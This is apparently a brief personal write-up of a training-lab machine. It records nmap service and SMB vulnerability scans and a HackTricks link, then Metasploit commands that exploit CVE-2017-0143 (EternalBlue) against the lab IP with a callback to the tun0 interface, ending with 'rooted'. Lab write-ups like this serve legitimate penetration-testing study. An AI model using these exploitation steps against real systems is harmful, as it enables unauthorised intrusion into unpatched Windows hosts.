```bash
nmap -sC -sV  -sS -Pn 10.129.227.181
```

![[Pasted image 20251024123109.png]]
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=445%2Ftcp%20microsoft-ds#port-445

![[Pasted image 20251024123648.png]]
![[Pasted image 20251024123823.png]]

```bash
nmap --script=smb-vuln* 10.129.227.181
```

![[Pasted image 20251024124310.png]]
```bash
$ msfconsole
$ search CVE-2017-0143
```
$ ![[Pasted image 20251024124911.png]]

```bash
$ use 10
$ set lhost tun0
$ set rhosts 10.129.227.181
$ run
```

rooted